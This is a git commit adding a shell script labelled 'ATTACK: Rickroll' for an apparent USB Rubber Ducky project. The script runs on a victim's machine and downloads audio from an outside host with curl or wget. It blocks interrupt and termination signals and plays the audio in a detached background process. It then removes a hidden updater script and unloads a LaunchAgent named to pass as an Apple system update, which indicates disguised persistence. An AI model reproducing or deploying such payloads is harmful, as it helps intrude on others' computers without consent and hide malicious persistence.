6b1746d85da56fb6803e8fe4b4627cd3234359f9
panik-144 <143279337+panik-144@users.noreply.github.com>
2025-11-23 15:11:26 +0100

    Activate Rickroll (sh)

---
+++ Rubber_Ducky/remote/activate.sh
@@ -0,0 +1,51 @@
+# ATTACK: Rickroll
+#!/bin/bash
+
+AUDIO_URL="https://keroserene.net/lol/roll.s16"
+TMP="/tmp/rickroll_eternal.s16"
+
+download_audio() {
+	if command -v curl >/dev/null; then
+		curl -sL "$AUDIO_URL" -o "$TMP"
+	elif command -v wget >/dev/null; then
+		wget -qO "$TMP" "$AUDIO_URL"
+	else
+		echo ":("
+		exit 1
+	fi
+}
+
+trap '' INT TERM HUP QUIT TSTP
+
+download_audio
+
+start_unstoppable() {
+	if command -v ffplay >/dev/null; then
+		(
+			ffplay -nodisp -autoexit -loglevel quiet \
+				-f s16le -ar 8000 -ac 1 "$TMP" \
+				>/dev/null 2>&1
+		) & disown
+	elif command -v mpv >/dev/null; then
+		(
+			mpv --no-video --really-quiet "$TMP" \
+				>/dev/null 2>&1
+		) & disown
+	elif command -v afplay >/dev/null; then
+		(
+			afplay -v 100 "$TMP" \
+				>/dev/null 2>&1
+		) & disown
+	else
+		echo ":(("
+		exit 1
+	fi
+}
+
+start_unstoppable
+
+echo "Womp Womp :("
+
+rm ~/.hidden_updater.sh;
+rm ~/Library/LaunchAgents/com.apple.systemupdate.plist;
+launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist
